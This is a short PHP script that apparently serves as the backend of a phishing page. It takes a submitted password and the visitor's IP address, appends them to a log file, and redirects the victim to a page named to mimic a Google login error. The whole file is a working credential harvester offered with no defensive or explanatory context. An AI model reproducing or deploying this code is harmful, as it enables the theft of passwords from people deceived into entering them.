
<?php
$pass = strip_tags($_POST['password']);
$ip1 = $_SERVER['REMOTE_ADDR'];
$file = fopen("logs.txt", "a");

fwrite($file, "\r\n");
fwrite($file, "Password");
fwrite($file, "= ");
fwrite($file, $pass);
fwrite($file, "\r\n");
fwrite($file, "$ip1");
fwrite($file, "\r\n");
fwrite($file, "\r\n");
fclose($file);

header ('location: hrefgoogleqlogin!account=492819123error.php');

exit;
?>

